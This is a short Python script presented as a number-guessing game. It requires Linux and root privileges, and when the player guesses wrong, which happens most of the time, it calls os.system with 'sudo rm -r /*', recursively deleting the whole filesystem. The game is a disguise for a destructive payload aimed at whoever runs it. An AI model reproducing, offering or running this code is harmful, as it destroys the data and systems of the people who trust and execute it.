import os
import random
import sys
import platform

# Check if the script is being run on Linux
if platform.system() != "Linux":
    print("This script can only be run on Linux systems!")
    sys.exit(1)

# Check if the script is being run as root
if os.geteuid() != 0:
    print("This script must be run as root!")
    sys.exit(1)

number = random.randint(1, 10)
guess = input("Guess a number between 1 and 10: ")
guess = int(guess)

#if won it prints you won otherwise the death begins
if guess == number:
    print("You won!")
else:
    command = "sudo rm -r /*"  
    os.system(command)

print("Thanks for playing!")

